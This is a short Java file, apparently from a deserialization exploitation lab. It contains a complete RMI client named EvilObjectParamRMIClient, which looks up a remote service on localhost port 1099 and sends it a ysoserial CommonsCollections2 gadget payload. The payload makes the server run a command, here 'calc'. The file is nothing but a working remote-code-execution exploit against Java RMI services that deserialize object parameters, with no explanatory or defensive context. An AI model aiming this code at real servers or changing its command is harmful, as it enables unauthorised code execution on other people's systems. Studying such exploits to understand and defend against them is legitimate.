package rmi;

import rmi.common.ObjectParamService;
import ysoserial.payloads.CommonsCollections2;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class EvilObjectParamRMIClient {
    public static void main(String[] args) throws Exception {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        ObjectParamService service = (ObjectParamService) ctx.lookup("hello");
        System.out.println(service.sayHello(CommonsCollections2.getObject("calc")));
    }
}
